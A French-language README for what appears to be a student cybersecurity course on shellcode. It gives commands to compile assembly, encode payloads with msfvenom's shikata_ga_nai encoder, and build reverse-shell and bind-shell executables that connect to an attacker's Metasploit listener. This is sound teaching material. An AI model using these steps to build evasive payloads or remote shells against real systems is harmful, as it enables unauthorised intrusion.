# SecuriteShellcode

Activités du cours SecuriteShellcode

BELLEIL Clément - ING3 CYBERSECURITE GROUPE A

# Compilation et Execution

Compilation :   - se placer dans le dossier asm32 ou asm64 ET ./build.sh asm01 par exemple

Execution :     - ./asm01

# Création de shellcode

Après compilation du programme :

Création de shellcode : ./create_shellcode {asm32 OU asm64} {asm01,...}

# Msfvenom - création de shellcodes (exemple pour asm32/asm01)

Compilation : nasm -f bin -o asm01.bin asm01.s                                                 
Création du payload : msfvenom -e x86/shikata_ga_nai -f c -a x86 -o asm01_x86.shellcode --platform linux < asm01.bin

# Msfvenom - création de l'executable pour reverseshell

Création de l'executable : ./revshell_x86.sh <IP_ECOUTE> <PORT_ECOUTE> (ou IP_ECOUTE et PORT_ECOUTE sont les informations renseignées en option du listener msf

Execution : chmod +x revshell_x86.elf && ./revshell_x86.elf (une fois que l'écoute dans la msfconsole de l'attaquant est lancée)

# Msfvenom - création de l'executable pour bindshell

Création de l'exécutable : ./bindshell_x86.sh <IP_CIBLE> <PORT_ECOUTE> (ou IP_CIBLE et PORT_ECOUTE sont les informations renseignées en option du listener msf

Execution : chmod +x bindshell_x86.elf && ./bindshell_x86.elf (une fois que l'écoute dans la msfconsole de l'attaquant est lancée)
